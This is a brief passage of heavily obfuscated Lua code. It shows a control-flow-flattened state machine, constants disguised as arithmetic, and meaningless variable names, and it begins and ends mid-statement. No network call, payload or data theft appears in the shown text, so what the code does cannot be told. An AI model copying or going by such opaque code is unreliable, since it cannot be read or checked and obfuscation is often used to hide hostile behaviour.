V[X]=E(I)end end end return(function(X,j,S,Q,v,V,E,J,M,O,f,W,r,T,e,c,k,Z,U,I,C,B,t)c,M,C,I,e,f,T,r,J,Z,O,B,W,U,t,k=function(X)local n,C=-1009856-(-1009857),X[-19984-(-19985)]while C do f[C],n=f[C]-(-945854-(-945855)),(-5081-(-5082))+n if f[C]==-1002898-(-1002898)then f[C],M[C]=nil,nil end C=X[n]end end,{},function(C,S,Q,v)local Qk,z,a,s,b,Ck,Z,D,fk,Sk,jk,h,P,m,Y,u,l,o,nk,G,i,x,H,Ek,J,N,Xk,y,R,d,q,F,c,L,f,Mk,g,vk,w,E,K,p,B,Vk,A while C do if C<8349744-100657 then if C<3738402-(-641200)then if C<-914589+3392470 then if
